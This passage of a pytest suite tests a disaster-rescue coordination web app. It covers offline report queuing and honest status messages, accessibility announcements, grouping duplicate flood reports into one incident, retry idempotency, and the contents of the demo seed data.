        assert made.get_json()["synced_late"] is False

    def test_garbage_is_refused_rather_than_treated_as_now(self, client):
        assert file_report(client, client_id="g", written_at="last tuesday"
                           ).status_code == 400

    def test_no_timestamp_means_now(self, client):
        # Anything that isn't the queue — including the plain form — should
        # behave exactly as it did before any of this existed.
        assert file_report(client, client_id="none").status_code == 201


class TestFilingOfflineIsHonestAboutIt:
    """The interface half. Somebody who has pressed Submit with no signal is
    owed an unambiguous answer, and the answer is *not* 'sent'."""

    @staticmethod
    def source(name):
        return (diresq.SCHEMA.parent / "static" / "scripts" / name
                ).read_text(encoding="utf-8")

    def test_a_queued_report_is_not_described_as_sent(self):
        text = self.source("report_file.js")
        assert "Saved on this phone. Not sent yet." in text
        assert "nobody has seen this" in text

    def test_it_still_says_to_call_911(self):
        # The one line that stays true whatever the network is doing.
        assert "call 911" in self.source("report_file.js")

    def test_the_waiting_count_is_visible(self):
        assert "waiting for signal" in self.source("reportqueue.js")

    def test_the_status_is_announced_not_only_shown(self):
        # Somebody with no signal may also be somebody using a screen reader,
        # and this is the message they cannot afford to miss.
        text = self.source("report_file.js")
        assert 'setAttribute("role", "status")' in text
        assert 'aria-live", "polite"' in text

    def test_the_region_is_unhidden_before_it_is_written_to(self):
        # A live region that is still `hidden` when its content changes is not
        # reliably announced. Order matters, and it is invisible at runtime.
        body = self.source("report_file.js").split("function say(")[1]
        assert body.index("status.hidden = false") < body.index(
            "status.innerHTML"), "the status is written before it is unhidden"

    def test_only_one_thing_announces_a_queued_report(self):
        # The status line already says how many are waiting. A live pill on
        # top of it makes a screen reader read the same fact twice, and the
        # important half is the one that gets talked over.
        pill = self.source("reportqueue.js")
        assert 'setAttribute("aria-hidden", "true")' in pill
        assert 'setAttribute("role", "status")' not in pill

    def test_the_suggestion_does_not_repeat_itself_at_you(self):
        # The panel is a live region and it re-runs on every pause in typing.
        # Rewriting identical markup reads the whole suggestion out again —
        # offline that includes a paragraph about the duplicate check, every
        # few seconds, at somebody describing an emergency.
        text = self.source("suggest.js")
        assert "panel.innerHTML !== markup" in text

    def test_it_gets_out_of_the_way_if_it_cannot_save(self):
        # A report that cannot be written to the device must not be promised.
        text = self.source("report_file.js")
        assert "if (!outcome.stored)" in text
        assert "form.submit()" in text

    def test_the_cached_form_does_not_reuse_a_stale_id(self):
        """The service worker keeps the report form so it opens with no
        signal. The id the server rendered into it would then be handed to two
        genuinely different reports, filing the second as a resend of the
        first — the guard turned against itself. So it is replaced on load.
        """
        assert "token.value = newId()" in self.source("report_file.js")

    def test_the_worker_keeps_the_form_but_not_the_feed(self):
        worker = self.source("sw.js")
        pages = worker.split("OFFLINE_PAGES = [")[1].split("]")[0]
        assert '"/report/new"' in pages
        for never in ['"/"', '"/board"', '"/map"']:
            assert never not in pages, f"the worker keeps {never}"


class TestDuplicatesAreCountedAsOneIncident:
    """The point of detecting duplicates, finally spent.

    Two reports of one flood, three responders on each, renders as two
    comfortably staffed rows unless the feed says otherwise. Three plus three
    looks fine. Six people at one address while the next street has nobody is
    the failure this entire project exists to make visible, and the feed was
    hiding it in its own data.
    """

    def two_reports(self, client):
        close(1)   # the seed's flooding house, at the same coordinates
        first = file_report(client, client_id="n1").get_json()["id"]
        second = file_report(client, client_id="n2").get_json()["id"]
        return first, second

    def incidents(self, client):
        return client.get("/api/incidents").get_json()

    def find(self, client, incident_id):
        return next(i for i in self.incidents(client) if i["id"] == incident_id)

    def test_two_reports_of_one_flood_are_one_row(self, client):
        first, second = self.two_reports(client)
        ids = [i["id"] for i in self.incidents(client)]
        assert first in ids
        assert second not in ids, "the duplicate is still its own row"

    def test_the_row_says_how_many_reports_it_is(self, client):
        first, _ = self.two_reports(client)
        assert self.find(client, first)["duplicate_count"] == 2

    def test_responders_across_both_are_counted_together(self, client):
        first, second = self.two_reports(client)
        client.post(f"/report/{first}/rescue")   # londo, through the app
        join_as(second, "skythe")                # somebody else, same incident

        incident = self.find(client, first)
        assert incident["en_route_count"] == 2, (
            "two people going to one incident read as one each")

    def test_the_same_person_on_both_is_one_person(self, client):
        """The trap in the obvious implementation.

        Summing the per-report counts would say two people are going when one
        is. Inventing help that isn't there is the same lie as hiding help
        that is, pointing the other way.
        """
        first, second = self.two_reports(client)
        client.post(f"/report/{first}/rescue")
        client.post(f"/report/{second}/rescue")
        assert self.find(client, first)["en_route_count"] == 1

    def test_further_along_wins_when_someone_joined_both(self, client):
        first, second = self.two_reports(client)
        client.post(f"/report/{first}/rescue")
        client.post(f"/report/{second}/rescue")
        aid = assignment_id_for(second)
        client.post(f"/api/assignments/{aid}/status", json={"status": "on_scene"})

        incident = self.find(client, first)
        assert incident["on_scene_count"] == 1
        assert incident["en_route_count"] == 0, (
            "counted once at each status instead of once at the furthest")

    def test_the_worst_priority_wins(self, client):
        # A duplicate filed LOW must not be able to quieten a HIGH one, for
        # the same reason the most cautious staffing signal wins.
        close(1)
        first = file_report(client, client_id="n1", priority="LOW").get_json()["id"]
        file_report(client, client_id="n2", priority="HIGH")
        assert self.find(client, first)["priority"] == "HIGH"

    def test_the_most_cautious_staffing_wins(self, client):
        first, second = self.two_reports(client)
        for report_id, vote in ((first, "overstaffed"), (second, "need_more")):
            client.post(f"/report/{report_id}/rescue")
            aid = assignment_id_for(report_id)
            client.post(f"/api/assignments/{aid}/status", json={"status": "on_scene"})
            client.post(f"/api/reports/{report_id}/staffing", json={"staffing": vote})
        assert self.find(client, first)["staffing"] == "need_more"

    def test_the_freshest_report_sets_the_age(self, client):
        # An older duplicate must not make a report filed a minute ago look
        # like something that may already have been dealt with.
        close(1)
        old = (datetime.now(timezone.utc)
               - timedelta(minutes=90)).isoformat(timespec="seconds")
        first = file_report(client, client_id="n1", written_at=old).get_json()["id"]
        file_report(client, client_id="n2")
        assert self.find(client, first)["minutes_old"] == 0

    def test_a_lone_report_is_an_incident_of_one(self, client):
        # Nothing about the common case changes. Every seeded report is its
        # own incident and the card reads exactly as it always has.
        for incident in self.incidents(client):
            assert incident["duplicate_count"] >= 1
        page = " ".join(client.get("/").get_data(as_text=True).split())
        assert "reports, one incident" not in page

    def test_the_coverage_gap_counts_the_incident_once(self, client):
        """The number that is supposed to be the honest one.

        Two duplicates of one flood with nobody going is one street nobody is
        going to. Counting it twice inflates the banner whose entire job is
        not to be inflated.
        """
        before = client.get("/").get_data(as_text=True)
        gaps_before = int(re.search(r'<span class="n">(\d+)</span>',
                                    before).group(1))
        self.two_reports(client)   # resolves one seeded report, adds two
        after = client.get("/").get_data(as_text=True)
        gaps_after = int(re.search(r'<span class="n">(\d+)</span>',
                                   after).group(1))
        assert gaps_after == gaps_before, (
            "two duplicates of one uncovered incident counted as two gaps")

    def test_covering_one_of_them_covers_the_incident(self, client):
        first, second = self.two_reports(client)
        client.post(f"/report/{second}/rescue")
        gaps = [i["id"] for i in diresq_gaps(client)]
        assert first not in gaps, (
            "somebody is on their way to this incident and it still reads as "
            "a gap, because they joined the report that isn't the lead one")

    def test_nothing_is_merged_in_the_database(self, client):
        # The grouping is a view. Both reports still exist, still open, and
        # either can still be joined and resolved on its own.
        first, second = self.two_reports(client)
        for report_id in (first, second):
            assert client.get(f"/report/{report_id}").status_code == 200
        with diresq.app.app_context():
            rows = diresq.get_db().execute(
                "SELECT status FROM reports WHERE id IN (?, ?)",
                (first, second)).fetchall()
        assert [r["status"] for r in rows] == ["unassigned", "unassigned"]

    def test_the_map_still_shows_both_pins(self, client):
        """Deliberately not grouped there.

        Two people reporting one flood from opposite ends of a street pinned
        two real places, and dropping one would be inventing a certainty we
        do not have about which is right.
        """
        first, second = self.two_reports(client)
        pinned = [r["id"] for r in client.get("/api/reports").get_json()]
        assert first in pinned and second in pinned

    def test_resolving_the_lead_leaves_the_other_standing(self, client):
        first, second = self.two_reports(client)
        client.post(f"/report/{first}/resolve")
        ids = [i["id"] for i in self.incidents(client)]
        assert second in ids, "the survivor vanished with its twin"
        assert self.find(client, second)["duplicate_count"] == 1

    def test_it_needs_a_session(self, anon):
        assert anon.get("/api/incidents").status_code in (302, 401)


def diresq_gaps(client):
    """The coverage-gap list, as the banner computes it."""
    with diresq.app.app_context():
        return diresq.coverage_gaps()


def join_as(report_id, username, status="en_route"):
    """Put somebody other than the fixture user on a report.

    The `client` fixture pins the session to londo, and the point of some of
    these tests is that two *different* people are going to one incident.
    """
    with diresq.app.app_context():
        db = diresq.get_db()
        who = db.execute("SELECT id FROM accounts WHERE username = ?",
                         (username,)).fetchone()["id"]
        db.execute("""
            INSERT INTO assignments (report_id, responder, status, joined_at)
            VALUES (?, ?, ?, ?)
        """, (report_id, who, status, diresq.now_iso()))
        db.commit()


class TestARetryIsNeverMistakenForATheft:
    """The lookup and the INSERT are two statements, so two retries of the
    same report can both pass the check and one lands on the UNIQUE
    constraint. Assuming that means somebody else's id was a real bug: the
    loser got a 409, the outbox reads any 4xx as "the server said no forever",
    and dropped the report.

    A flapping connection — the exact condition the queue exists for — would
    have deleted somebody's call for help and told them the wrong reason.
    """

    @staticmethod
    def steal(client_id, table, owner_column):
        """Write a row under this id owned by somebody who isn't the fixture
        user, the way a genuine collision between two accounts would look."""
        with diresq.app.app_context():
            db = diresq.get_db()
            other = db.execute(
                "SELECT id FROM accounts WHERE username != 'londo' LIMIT 1"
            ).fetchone()["id"]
            if table == "reports":
                db.execute("""
                    INSERT INTO reports (subject, description, priority,
                        lat, lng, status, sender, client_id,
                        created_at, received_at)
                    VALUES ('Theirs', '', 'LOW', 29.78, -95.82, 'unassigned',
                            ?, ?, ?, ?)
                """, (other, client_id, diresq.now_iso(), diresq.now_iso()))
            else:
                db.execute("""
                    INSERT INTO checkins (responder, lat, lng, client_id,
                                          created_at, received_at)
                    VALUES (?, 29.78, -95.82, ?, ?, ?)
                """, (other, client_id, diresq.now_iso(), diresq.now_iso()))
            db.commit()
            return other

    def test_losing_the_race_to_yourself_is_a_success(self, client, monkeypatch):
        """The real path, not the helper it calls.

        A concurrent retry is hard to schedule from a test, but what the race
        *is* is precise: the idempotency lookup misses, the row exists by the
        time the INSERT runs. So make the lookup miss once and let the rest
        run for real, `except sqlite3.IntegrityError` included.
        """
        made = file_report(client, client_id="racer").get_json()

        class LookupMisses:
            """A database that answers the idempotency lookup with "nothing
            here" exactly once, then behaves normally."""

            def __init__(self, real):
                self._real = real
                self.armed = True

            def execute(self, sql, params=()):
                if self.armed and "FROM reports" in sql and "client_id" in sql:
                    self.armed = False
                    return self._real.execute("SELECT 1 WHERE 0")
                return self._real.execute(sql, params)

            def __getattr__(self, name):
                return getattr(self._real, name)

        real = diresq.get_db
        blinkered = {}

        def blind_once():
            db = real()
            return blinkered.setdefault(id(db), LookupMisses(db))

        monkeypatch.setattr(diresq, "get_db", blind_once)
        again = file_report(client, client_id="racer")

        assert again.status_code == 200, (
            "a retry of your own report was refused — the outbox reads that "
            "as final and throws the report away")
        body = again.get_json()
        assert body["duplicate"] is True
        assert body["id"] == made["id"], "handed back somebody else's report"
        assert count_reports() == 6, "the race filed a second incident"

    def test_and_it_does_not_file_a_second_one(self, client):
        file_report(client, client_id="racer")
        before = count_reports()
        # Whatever the race does, the outcome the person needs is one report.
        file_report(client, client_id="racer")
        assert count_reports() == before

    def test_a_genuine_collision_between_accounts_is_still_a_409(self, client):
        # The check must not have become "always say yes". Somebody else's id
        # is still refused rather than handing them another person's report.
        self.steal("shared", "reports", "sender")
        answer = file_report(client, client_id="shared")
        assert answer.status_code == 409
        assert "belongs to someone else" in answer.get_json()["error"]

    def test_the_same_holds_for_check_ins(self, client):
        self.steal("shared", "checkins", "responder")
        answer = client.post("/api/checkin",
                             json={"lat": 29.78, "lng": -95.82,
                                   "client_id": "shared"})
        assert answer.status_code == 409

    def test_a_check_in_retry_of_your_own_is_not_a_409(self, client):
        first = client.post("/api/checkin", json={"lat": 29.78, "lng": -95.82,
                                                  "client_id": "mine"})
        assert first.status_code == 201
        again = client.post("/api/checkin", json={"lat": 29.78, "lng": -95.82,
                                                  "client_id": "mine"})
        assert again.status_code == 200
        assert again.get_json()["duplicate"] is True

    def test_the_outbox_only_drops_what_the_server_truly_refused(self):
        # Why the above matters: a 4xx is treated as final. If a retry of your
        # own report could produce one, this line would delete it.
        source = (diresq.SCHEMA.parent / "static" / "scripts"
                  / "reportqueue.js").read_text(encoding="utf-8")
        assert "res.status >= 400 && res.status < 500" in source
        assert "refused: true" in source


class TestNothingLeavesTheQueueQuietly:
    """A report that ages out used to be filtered on read: never written back,
    never mentioned. Somebody pressed submit, read "saved on this phone", and
    twelve hours later it was gone with nothing anywhere saying so.

    This whole project is an argument that a silent failure is worse than a
    loud one, and the queue was doing the thing the board exists to prevent.
    """

    @staticmethod
    def source(name):
        return (diresq.SCHEMA.parent / "static" / "scripts" / name
                ).read_text(encoding="utf-8")

    def test_an_expired_report_is_kept_not_deleted(self):
        text = self.source("reportqueue.js")
        assert "STRANDED_KEY" in text
        assert "function strand(" in text
        assert "export function stranded(" in text

    def test_it_is_actually_removed_from_the_live_queue(self):
        # The old version filtered on every read and wrote the same expired
        # items back, so they sat in storage forever costing space.
        body = self.source("reportqueue.js").split("function fresh(")[1]
        assert "strand(expired)" in body
        assert "write(live)" in body

    def test_the_person_is_told_on_the_next_open(self):
        text = self.source("report_file.js")
        assert "never sent" in text
        assert "showStranded()" in text

    def test_it_shows_them_what_they_wrote(self):
        # The queue is the only place those words still exist. A count would
        # tell somebody they lost something without telling them what.
        text = self.source("report_file.js")
        assert "esc(item.subject)" in text
        assert "esc(item.description)" in text

    def test_it_does_not_disappear_on_its_own(self):
        # It clears when they say they have read it, not on a timer.
        text = self.source("report_file.js")
        assert "dismiss-lost" in text
        assert "clearStranded()" in text

    def test_it_does_not_offer_a_retry_that_would_bounce(self):
        # The server refuses anything this old and is right to — the report
        # describes a house as it was half a day ago.
        text = self.source("report_file.js")
        assert "too old for the server to accept" in text
        assert "file it again" in text

    def test_it_still_says_to_call_911(self):
        assert "call 911" in self.source("report_file.js")

    def test_the_two_expiry_limits_cannot_drift(self):
        """`MAX_AGE_HOURS` in the browser and `MAX_BACKDATE_HOURS` on the
        server have to agree, in two languages, with nothing else connecting
        them. Too low and reports are stranded the server would have taken;
        too high and they are sent to be rejected."""
        text = self.source("reportqueue.js")
        match = re.search(r"const MAX_AGE_HOURS = (\d+)", text)
        assert match, "MAX_AGE_HOURS is gone from reportqueue.js"
        assert int(match.group(1)) == diresq.MAX_BACKDATE_HOURS, (
            f"the browser drops reports after {match.group(1)}h but the "
            f"server accepts them up to {diresq.MAX_BACKDATE_HOURS}h")

    def test_the_check_in_queue_uses_the_same_number(self):
        text = self.source("queue.js")
        match = re.search(r"const MAX_AGE_HOURS = (\d+)", text)
        assert match and int(match.group(1)) == diresq.MAX_BACKDATE_HOURS

    @pytest.mark.skipif(shutil.which("node") is None,
                        reason="node is not installed; this runs the real module")
    def test_it_actually_does_this_and_not_only_says_so(self):
        """The rest of this class reads the source, because the bugs it
        guards are invisible at runtime and obvious in the file. This one runs
        the real module against a fake browser, because "the words
        `strand(expired)` appear in the file" does not prove a report survived
        being expired — and that survival is the whole fix.
        """
        root = diresq.SCHEMA.parent
        done = subprocess.run(
            ["node", str(root / "tools" / "queuecheck.mjs")],
            capture_output=True, text=True, cwd=str(root), timeout=60)
        assert done.returncode == 0, done.stderr
        result = json.loads(done.stdout)

        assert result["pending"] == 1, "the fresh report stopped being sendable"
        assert result["stranded"] == 1, "the expired report was thrown away"
        assert result["stranded_subject"] == "Water rising on Kingsland"
        assert "Two adults upstairs" in result["stranded_description"], (
            "kept the fact of a lost report but not what it said — and this "
            "is the only place those words still exist")
        assert result["queue_ids"] == ["still-good"], (
            "the expired report is still sitting in storage, filtered on "
            "every read and written back forever")
        assert result["stranded_after_clear"] == 0
        assert result["pending_after_clear"] == 1, (
            "dismissing what they had read also dropped a report that could "
            "still be sent")

    def test_a_link_we_did_not_mint_is_not_rendered(self):
        """`esc()` stops an attacker breaking out of the attribute; it does
        nothing about `javascript:`, which needs no quotes. The shape is
        checked rather than trusted, so the next person to change what the
        endpoint returns doesn't have to know that."""
        text = self.source("report_file.js")
        assert "function ours(url)" in text
        assert r"/^\/report\/\d+$/" in text
        assert "esc(outcome.url)" not in text.replace("ours(outcome.url)", "")


class TestDuplicateLinksOnlyEverPointBackwards:
    """`incident_root` walks `dupe_of` and says in its docstring that the
    chain terminates because a report is always linked to an older one. That
    was true and unenforced, which held only while the check ran exactly once
    per report at insert time.

    Run it over a table that already contains both halves of a pair — which
    the demo seed does — and the two link to each other. The cycle guard then
    hands back two different roots, the pair never groups, and there is no
    error anywhere: the detector working perfectly and the feed showing
    nothing.
    """

    def pair(self, client):
        close(1)
        first = file_report(client, client_id="n1").get_json()["id"]
        second = file_report(client, client_id="n2").get_json()["id"]
        return first, second

    def links(self):
        with diresq.app.app_context():
            return {r["id"]: r["dupe_of"] for r in diresq.get_db().execute(
                "SELECT id, dupe_of FROM reports")}

    def test_a_rerun_cannot_make_two_reports_point_at_each_other(self, client):
        first, second = self.pair(client)
        with diresq.app.app_context():
            for report_id in (first, second):
                diresq.link_duplicate(report_id)

        links = self.links()
        assert links[first] != second, (
            "the older report was pointed at the newer one, which is a cycle")
        assert links[second] == first

    def test_and_the_pair_still_groups_afterwards(self, client):
        # The symptom the cycle actually produced: no error, no link visible
        # as wrong, just a grouped card that silently stopped appearing.
        first, second = self.pair(client)
        with diresq.app.app_context():
            for report_id in (first, second):
                diresq.link_duplicate(report_id)
        grouped = [i for i in client.get("/api/incidents").get_json()
                   if i["duplicate_count"] > 1]
        assert grouped, "the pair stopped grouping after a re-run"

    def test_running_it_many_times_changes_nothing(self, client):
        first, second = self.pair(client)
        with diresq.app.app_context():
            for _ in range(5):
                for report_id in (first, second):
                    diresq.link_duplicate(report_id)
        assert self.links()[second] == first
        assert self.links()[first] is None

    def test_a_root_is_reachable_from_every_report(self, client):
        # What the cycle broke. Walking up from anywhere must terminate at a
        # report that points at nothing.
        self.pair(client)
        links = self.links()
        for report_id in links:
            root = diresq.incident_root(report_id, links)
            assert links.get(root) is None, (
                f"walking up from {report_id} ended at {root}, which still "
                f"points somewhere — that is a cycle")


class TestTheDemoSeedTellsTheStory:
    """A judge opening the hosted demo clicks around for ninety seconds. If
    the seed doesn't already show the offline story, none of it exists for
    them — and the Devpost links straight there.

    So the seed carries the case the whole feature was built for: two
    neighbours filing one flood, one of them with no signal.
    """

    @pytest.fixture
    def demo(self, tmp_path, monkeypatch):
        monkeypatch.setattr(diresq, "DATABASE", str(tmp_path / "demo.db"))
        monkeypatch.setenv("DIRESQ_DEV_USER", "londo")
        diresq.init_db()
        diresq.seed_data()
        return diresq.app.test_client()

    def incidents(self, demo):
        return demo.get("/api/incidents").get_json()

    def test_the_feed_has_a_grouped_incident_on_first_load(self, demo):
        grouped = [i for i in self.incidents(demo) if i["duplicate_count"] > 1]
        assert grouped, "the demo shows none of the grouping work"

    def test_it_is_the_worst_report_on_the_board(self, demo):
        # Top of the feed, so it is the first thing anybody reads.
        assert self.incidents(demo)[0]["duplicate_count"] > 1

    def test_more_people_are_going_than_either_report_shows(self, demo):
        """The convergence, which is the point.

        One person has been on scene for over an hour; two more with boats
        set off for the *other* report of the same house. Split across two
        rows that reads as one job with somebody on it and another with
        nobody. It is three people at one address.
        """
        top = self.incidents(demo)[0]
        assert top["on_scene_count"] + top["en_route_count"] >= 3
        assert top["on_scene_count"] >= 1 and top["en_route_count"] >= 2

    def test_one_of_them_arrived_late_and_says_so(self, demo):
        top = self.incidents(demo)[0]
        assert top["synced_late"] is True
        assert top["stale_minutes"] is not None

    def test_the_card_says_all_of_it_without_anybody_typing(self, demo):
        page = " ".join(demo.get("/").get_data(as_text=True).split())
        assert "2 reports, one incident" in page
        assert "to 1 incident" in page
        assert "reached us later" in page

    def test_the_two_free_responders_are_still_free(self, demo):
        # A board where everybody is busy has nothing to say when a report
        # needs a boat. Adding people to the duplicate must not eat them.
        board = demo.get("/api/responders").get_json()
        idle = [r["username"] for r in board if r["state"] == "available"]
        assert "r.castillo" in idle and "t.oyelaran" in idle

    def test_the_seed_does_not_hand_write_the_link(self):
        """It runs the real detector.

        Setting `dupe_of` directly would let the demo show a grouped card the
        software could not actually produce — which is the one thing a demo
        must never do, and exactly the failure this project keeps arguing
        against everywhere else.
        """
        source = (diresq.SCHEMA.parent / "app.py").read_text(encoding="utf-8")
        body = source.split("def seed_data(")[1].split("@app.cli.command")[0]
        # Comments in here explain why it doesn't, and would match otherwise.
        code = "\n".join(line for line in body.splitlines()
                         if not line.lstrip().startswith("#"))
        assert "link_duplicate(" in code
        assert "dupe_of" not in code, "the seed writes the link by hand"

    def test_the_other_seeded_reports_are_left_alone(self, demo):
        # Only the one intended pair groups. Everything else in Katy is
        # kilometres away and stays its own incident.
        counts = [i["duplicate_count"] for i in self.incidents(demo)]
        assert counts.count(1) == len(counts) - 1

    def test_the_dead_mans_switch_demo_still_works(self, demo):
        # s.reyes goes quiet and the board turns red. That is the closing
        # beat of the video and must not have been disturbed.
        board = demo.get("/api/responders").get_json()
        assert any(r["username"] == "s.reyes" and r["overdue"] for r in board)


class TestTheStaleLineDescribesTheLateReport:
    """"Written N minutes ago, reached us later" takes N from one report and
    the lateness from another unless something says otherwise. On a grouped
    incident those need not be the same report, and two true facts assembled
    into one sentence make a false one.
    """

    def test_the_age_shown_belongs_to_the_report_that_was_late(self, client):
        close(1)
        # Fresh, on time. Then an older one that sat in a queue.
        first = file_report(client, client_id="fresh").get_json()["id"]
        late = (datetime.now(timezone.utc)
                - timedelta(minutes=55)).isoformat(timespec="seconds")
        file_report(client, client_id="late", written_at=late)

        incident = next(i for i in client.get("/api/incidents").get_json()
                        if i["id"] == first)
        assert incident["synced_late"] is True
        assert incident["minutes_old"] == 0, "ordering should use the freshest"
        assert incident["stale_minutes"] == 55, (
            "the card would have said the incident was written 0 minutes ago "
            "and also that it reached us late")

    def test_the_page_prints_that_one(self, client):
        close(1)
        file_report(client, client_id="fresh")
        late = (datetime.now(timezone.utc)
                - timedelta(minutes=55)).isoformat(timespec="seconds")
        file_report(client, client_id="late", written_at=late)
        page = " ".join(client.get("/").get_data(as_text=True).split())
        assert "Written 55 minutes ago, reached us later" in page

    def test_nothing_late_means_nothing_to_report(self, client):
        incident = client.get("/api/incidents").get_json()[0]
        assert incident["synced_late"] is False
        assert incident["stale_minutes"] is None
